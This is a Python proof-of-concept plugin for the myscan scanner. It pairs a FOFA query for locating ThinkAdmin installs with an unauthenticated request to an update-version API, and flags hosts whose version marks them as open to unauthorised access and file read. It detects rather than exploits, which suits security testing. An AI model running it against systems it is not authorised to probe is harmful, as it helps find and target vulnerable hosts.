# !/usr/bin/env python3
# @Time    : 2020/9/18
# @Author  : caicai
# @File    : poc_thinkadmin_unauth_and_read_file.py


'''
fofa 'app="ThinkAdmin"'
'''

from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "thinkadmin_unauth_and_read_file"
        self.vulmsg = "根据版本号判断，详见文章link: https://forum.ywhack.com/thread-1546-1-1.html"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return

        req = {
            "method": "GET",
            "url": self.url + "public/admin.html?s=admin/api.Update/version",
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
            "allow_redirects": False

        }
        r = request(**req)
        if r != None and r.status_code == 200 and "json" in r.headers.get("Content-Type", ""):
            try:
                data = r.json()
                ver = data.get("data", {}).get("wechat", {}).get("version", "999999999999").replace(".", "")
                print(ver)
                if int(ver) <= 2020080301:
                    parser_ = response_parser(r)
                    self.result.append({
                        "name": self.name,
                        "url": parser_.geturl(),
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "request": parser_.getrequestraw(),
                            "response": parser_.getresponseraw()
                        }
                    })
            except Exception as ex:
                print(ex)
                pass
